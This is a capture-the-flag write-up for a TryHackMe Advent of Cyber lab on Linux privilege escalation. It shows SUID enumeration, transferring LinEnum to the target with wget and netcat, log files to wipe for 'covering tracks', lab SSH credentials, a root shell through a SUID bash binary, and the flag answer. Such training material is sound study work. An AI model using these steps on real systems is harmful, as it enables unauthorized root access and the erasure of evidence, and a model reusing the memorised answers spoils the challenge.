# TRYHACKME: ADVENTOFCYBER2 [DAY 11] NETWORKING - The Rogue Gnome: Prelude

```
This is it - the moment that Elf McEager has been waiting for. It's the final exam of the Nmap course that he enlisted on during "Day 8 - What's Under the Christmas Tree?". It looks like all that hard work of hitting the books has paid off..."Success!" Elf McEager screams..."the exploit worked! Yippeee!"

Elf McEager has successfully managed to create a reverse shell from the target back to his computer. Little did he know, the real exam begins now...The last stage of the exam requires Elf McEager to escalate his privileges! He spent so much time studying Nmap cheatsheets that he's now drawing a blank...Can you help Elf McEager?

To be the good guy, sometimes you gotta be the bad guy first...
```

TOPICS: Privilege escalation, DVWA, SUID, GTFOBins, Enumeration Scripts (LinEnum)

```
SUID - permission bit that allows users to run the executable as whoever owns it (without having to be /etc/sudoers)

find / -perm -u=s -type f 2>/dev/null
```

```
LinEnum - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python3 -m http.server 8080 # turn our machine into a webserver to serve the file to the target machine
# fetch via wget, or netcat (nc -l -p 1137 > LinEnum.sh; nc -w 3 TARGET_IP 1137 < LinEnum.sh)
```

```
covering up our tracks

/var/log/auth.log
/var/log/syslog
/var/log/<service>/*.log
```

### QUESTIONS

What type of privilege escalation involves using a user account to execute commands as an administrator?

```
vertical
```

What is the name of the file that contains a list of users who are a part of the sudo group?

```
sudoers
```

Use SSH to log in to the vulnerable machine.

```
ssh cmnatic@10.10.60.244
passwd aoc2020
```

Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.  You may find uploading some of the enumeration scripts that were used during today's task to be useful.

```
$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/newgidmap
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chsh
```

Use this executable to launch a system shell as root.  What are the contents of the file located at /root/flag.txt?

```
-bash-4.4$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
-bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/flag.txt
thm{2fb10afe933296592}
```
